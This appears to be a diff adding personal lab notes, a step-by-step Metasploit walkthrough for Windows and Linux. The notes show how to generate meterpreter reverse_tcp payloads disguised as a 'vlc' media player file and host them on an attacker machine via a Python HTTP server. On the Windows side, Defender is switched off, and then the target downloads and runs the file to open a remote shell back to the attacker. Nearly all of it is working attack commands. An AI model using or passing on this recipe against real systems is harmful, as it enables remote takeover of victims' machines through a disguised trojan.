@@ -1,0 +1,53 @@
+1. WINDOWS PAYLOAD:
+--------------------------------------------
+msfconsole 
+> use payload/windows/x64/meterpreter/reverse_tcp
+> set LHOST  x.x.x.x .............Your_Machine_IP
+> set LPORT 9090...........whichever port you want
+> generate -f exe -o /home/kali/demo/vlc.exe..........give your path where you want to store the .exe file
+> back
+> use multi/handler
+> set LHOST  x.x.x.x .............Your_Machine_IP
+> set LPORT 9090...........whichever port you want(same which you had set before for reverse_tcp)
+> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+> exploit
+
+new tab:
+Create python server:
+cd /home/kali/demo
+python3 -m http.server --bind 80 ........the .exe file will be  hosted
+
+Now go to Windows machine:
+---------------------------
+Check the microsoft defender protection is off:
+now go to the browser on windows:
+type  X.X.X.X: ...........kali machine IP..........access the .exe file and download it and run it
+Now you will get the meterpreter connection on your kali machine
+
+
+2.LINUX PAYLOAD
+----------------------------------------------------
+
+msfconsole 
+> use payload/linux/x64/meterpreter/reverse_tcp
+> set LHOST  x.x.x.x .............Your_Machine_IP
+> set LPORT 9090...........whichever port you want
+> generate -f elf -o /home/kali/demo/vlc..........give your path where you want to store the vlc file
+> back
+> use multi/handler
+> set LHOST  x.x.x.x .............Your_Machine_IP
+> set LPORT 9090...........whichever port you want(same which you had set before for reverse_tcp)
+> set PAYLOAD linux/x64/meterpreter/reverse_tcp
+> exploit
+
+new tab:
+Create python server:
+cd /home/kali/demo
+python3 -m http.server --bind 80 ........the payload file will be hosted
+
+Now go to Ubuntu(debian) machine:
+---------------------------
+now go to the browser:
+type  X.X.X.X: ...........kali machine IP..........access the file and download it and run it
+Now you will get the meterpreter connection on your kali machine
+
